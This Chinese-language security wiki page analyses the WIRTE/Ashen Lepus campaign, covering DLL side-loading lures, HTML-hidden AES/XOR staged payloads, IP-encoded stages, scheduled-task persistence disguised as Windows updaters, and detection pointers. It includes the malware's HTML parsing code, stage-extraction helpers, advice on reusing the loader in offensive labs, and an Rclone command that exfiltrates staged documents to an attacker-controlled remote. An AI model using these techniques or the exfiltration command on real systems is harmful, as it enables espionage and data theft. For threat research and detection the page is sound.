# 通过 HTML 嵌入式 payload 分阶段进行高级 DLL Side-Loading

{{#include ../../../banners/hacktricks-training.md}}

## 技术概览

Ashen Lepus（又名 WIRTE）将一种可重复利用的模式武器化，把 DLL sideloading、分阶段 HTML payload 和模块化 .NET 后门串联起来，持久化进入中东外交网络。任何操作者都可以复用这种技术，因为它依赖于：

- **基于压缩包的社工**：看似无害的 PDF 诱导目标从文件分享站点下载一个 RAR 压缩包。压缩包内包含一个看起来像真的文档查看器 EXE、一个以受信任库命名的恶意 DLL（例如 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`），以及一个诱饵 `Document.pdf`。
- **DLL 搜索顺序滥用**：受害者双击 EXE，Windows 会从当前目录解析 DLL 导入，恶意加载器（AshenLoader）就在受信任进程内执行，而诱饵 PDF 会被打开以降低怀疑。
- **Living-off-the-land 分阶段**：后续每一阶段（AshenStager → AshenOrchestrator → modules）在需要之前都不会落盘，而是通过隐藏在原本无害的 HTML 响应中的加密 blob 传递。

## 多阶段 Side-Loading 链

1. **诱饵 EXE → AshenLoader**：EXE side-loads AshenLoader，后者执行主机侦察，对其进行 AES-CTR 加密，并通过 `token=`、`id=`、`q=` 或 `auth=` 等轮换参数把它 POST 到看起来像 API 的路径（例如 `/api/v2/account`）。
2. **HTML 提取**：只有当客户端 IP 地理定位到目标区域且 `User-Agent` 与 implant 匹配时，C2 才会暴露下一阶段，从而挫败沙箱。检查通过后，HTTP body 中会包含一个 `<headerp>...</headerp>` blob，其中是 Base64/AES-CTR 加密的 AshenStager payload。
3. **第二次 sideload**：AshenStager 随另一个导入 `wtsapi32.dll` 的合法二进制一起部署。注入到该二进制中的恶意副本会获取更多 HTML，这一次解析 `<article>...</article>` 以恢复 AshenOrchestrator。
4. **AshenOrchestrator**：一个模块化的 .NET 控制器，解码一个 Base64 JSON 配置。配置中的 `tg` 和 `au` 字段会被拼接/哈希进 AES key 中，用于解密 `xrk`。得到的字节随后作为 XOR key，供之后拉取的每个模块 blob 使用。
5. **模块投递**：每个模块都通过 HTML 注释来描述，从而把解析器重定向到任意 tag，突破仅检查 `<headerp>` 或 `<article>` 的静态规则。模块包括持久化（`PR*`）、卸载器（`UN*`）、侦察（`SN`）、屏幕捕获（`SCT`）和文件浏览（`FE`）。

### HTML 容器解析模式
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
即使防御者阻止或移除了某个特定元素，操作员只需更改 HTML 注释中提示的标签即可恢复投递。

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

最近的 HTML smuggling 研究（Talos）强调了将 payload 隐藏为 HTML 附件中 `<script>` 块内的 Base64 字符串，并在运行时通过 JavaScript 解码。这个技巧同样可以复用于 C2 responses：把加密 blobs 分阶段放在 script tag（或其他 DOM element）里，并在内存中于 AES/XOR 之前解码，使页面看起来像普通 HTML。Talos 还展示了在 script tags 内的分层混淆（identifier renaming 以及 Base64/Caesar/AES），这可以很自然地映射到 HTML-staged C2 blobs。Talos 后来关于 **hidden text salting** 的文章在这里也同样相关：用无关的 HTML comments 或 whitespace 拆分 Base64，就足以绕过简单的 regex extractors，同时让浏览器端重建保持非常简单。

## Recent Variant Notes (2024-2025)

- Check Point 观察到 2024 年的 WIRTE campaigns 仍然依赖 archive-based sideloading，但使用 `propsys.dll`（stagerx64）作为第一阶段。该 stager 用 Base64 + XOR（key `53`）解码下一个 payload，使用硬编码的 `User-Agent` 发送 HTTP requests，并提取嵌在 HTML tags 之间的加密 blobs。在一个分支中，stage 先从一长串嵌入的 IP strings 重建，这些字符串通过 `RtlIpv4StringToAddressA` 解码，然后再拼接成 payload bytes。
- OWN-CERT 记录了更早期的 WIRTE tooling，其中 side-loaded 的 `wtsapi32.dll` dropper 使用 Base64 + TEA 保护字符串，并把 DLL name 本身作为解密 key，然后在发送到 C2 之前对 host identification data 进行 XOR/Base64 混淆。

## Reconstructing IP-Encoded Stages

WIRTE 的 2024 `propsys.dll` 分支表明，下一阶段 PE 不必以一个连续的 HTML blob 形式存在。loader 可以把 stage bytes 伪装成 dotted-quad strings 存储，并用 `RtlIpv4StringToAddressA` 重建它们，这种模式与 Hive 的 **IPfuscation** tradecraft 非常接近。从操作上看，当 actor 想让 HTML page 看起来像无害的 IOCs 或 config data，而不是明显的 Base64 payload 时，这很有用。
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
如果恢复出的字节以 `MZ` 开头，你很可能是直接重建了下一个 PE。否则，检查是否存在前导 XOR/Base64 层，或者地址之间是否有小的分隔符块。

## 可切换的 DLL 名称与宿主轮换

这种模式的一个强大特性是，**HTML/AES/XOR staging 后端可以保持完全相同，而只更换 sideload 组合**。WIRTE 在多个 campaign 中轮换使用了 `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll` 和 `propsys.dll`，这很有用，因为：

- `propsys.dll` 和 `wtsapi32.dll` 是普通的 Windows DLL 名称，防守方通常预期它们会存在于 `%System32%` / `%SysWOW64%` 中。
- **HijackLibs** 等公开目录已经映射了许多会从复制后的应用目录加载这些 DLL 名称的二进制文件，使操作者能够获得替代宿主，而无需重新设计 stager。
- 只需要针对每个宿主调整导出接口即可。HTML 解析器、AES/XOR 例程以及模块加载器通常都可以原样移植到一个转发 proxy DLL 中。

对于进攻性实验室工作来说，这意味着你可以把问题拆分为 **(1) 找到一个稳定的已签名宿主，它会在本地解析你选择的 DLL 名称**，以及 **(2) 在该 DLL 后面复用同一套 staged-HTML loader 逻辑**。

## Crypto & C2 加固

- **处处使用 AES-CTR**：当前 loader 会内嵌 256-bit 密钥和 nonce（例如 `{9a 20 51 98 ...}`），并可在解密前后再加一层 XOR，使用类似 `msasn1.dll` 的字符串。
- **密钥材料变体**：早期的 loader 使用 Base64 + TEA 来保护内嵌字符串，解密密钥由恶意 DLL 名称派生（例如 `wtsapi32.dll`）。
- **基础设施拆分 + 子域伪装**：staging 服务器按工具拆分，分布在不同的 ASN 上，有时还使用看起来合法的子域做前置，因此烧掉一个 stage 不会暴露其余部分。
- **Recon smuggling**：枚举到的数据现在包括 Program Files 列表，用来识别高价值应用，并且在离开主机前始终会先加密。
- **URI churn**：查询参数和 REST 路径会在不同 campaign 间轮换（`/api/v1/account?token=` → `/api/v2/account?auth=`），使脆弱的检测失效。
- **User-Agent pinning + safe redirects**：C2 基础设施只对精确的 UA 字符串响应，否则就重定向到无害的新闻/健康网站以伪装流量。
- **Gated delivery**：服务器设置了地理围栏，只响应真实 implant。未获授权的客户端会收到看起来无害的 HTML。

## 持久化与执行循环

AshenStager 会投放计划任务，伪装成 Windows 维护任务，并通过 `svchost.exe` 执行，例如：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

这些任务会在启动或按时间间隔重新拉起 sideload 链路，从而确保 AshenOrchestrator 可以在不再次触碰磁盘的情况下请求新的模块。

## 使用无害的同步客户端进行外传

操作者通过专用模块把外交文档暂存到 `C:\Users\Public` 中（所有用户可读且不显眼），然后下载合法的 [Rclone](https://rclone.org/) 二进制文件，将该目录与攻击者存储同步。Unit42 指出，这是首次观察到该 actor 使用 Rclone 进行外传，这与更广泛的趋势一致：滥用合法同步工具，以混入正常流量中：

1. **Stage**: 将目标文件复制/收集到 `C:\Users\Public\{campaign}\`。
2. **Configure**: 提供一个指向攻击者控制的 HTTPS 端点的 Rclone 配置（例如 `api.technology-system[.]com`）。
3. **Sync**: 运行 `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`，使流量看起来像正常的云备份。

由于 Rclone 被广泛用于合法备份流程，防守方必须关注异常执行（新二进制、异常 remote，或突然同步 `C:\Users\Public`）。

## 检测切入点

- 告警：**已签名进程**意外从用户可写路径加载 DLL（Procmon 过滤器 + `Get-ProcessMitigation -Module`），尤其是 DLL 名称与 `netutils`、`srvcli`、`dwampi`、`wtsapi32` 或 `propsys` 重叠时。
- 检查可疑的 HTTPS 响应中是否存在 **嵌入在异常标签里的大块 Base64**，或被 `<!-- TAG: <xyz> -->` 注释保护。
- 先规范化 HTML：**在提取 Base64 前移除注释并折叠空白字符**，因为 hidden-text-salting 风格的规避会把 payload 拆到注释边界之间。
- 将 HTML hunting 扩展到 **`<script>` 块中的 Base64 字符串**（HTML smuggling 风格的 staging），这些内容会在 AES/XOR 处理前通过 JavaScript 解码。
- 寻找反复调用 **`RtlIpv4StringToAddressA` 后接缓冲区组装** 的行为，尤其是周围字符串是很长的 IPv4 列表而不是真实网络目标时。
- 寻找以非服务参数运行 `svchost.exe` 或指向 dropper 目录的 **计划任务**。
- 追踪只在收到精确 `User-Agent` 字符串时才返回 payload、否则跳转到合法新闻/健康域名的 **C2 重定向**。
- 监控出现在 IT 托管位置之外的 **Rclone** 二进制文件、新的 `rclone.conf` 文件，或从 `C:\Users\Public` 等 staging 目录拉取数据的同步任务。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
